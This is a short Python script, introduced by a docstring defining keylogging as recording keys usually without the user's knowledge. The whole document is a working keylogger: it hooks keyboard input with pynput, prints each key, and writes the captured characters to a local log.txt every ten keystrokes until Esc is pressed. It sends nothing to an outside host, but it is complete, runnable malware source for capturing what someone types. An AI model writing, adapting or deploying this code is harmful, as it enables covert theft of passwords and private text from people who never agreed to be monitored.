'''
Keystroke logging, is the process of recording (logging)
the keys pressed on a keyboard (usually when the user is unaware).
It is also known as keylogging or keyboard capturing.
'''
from pynput.keyboard import Key, Listener

count = 0
keys = []


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{} pressed".format(key))
    
    #Updates text every 10 count
    if count >=10:
        count = 0
        write_file(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return False

if __name__ == "__main__":
    with Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()


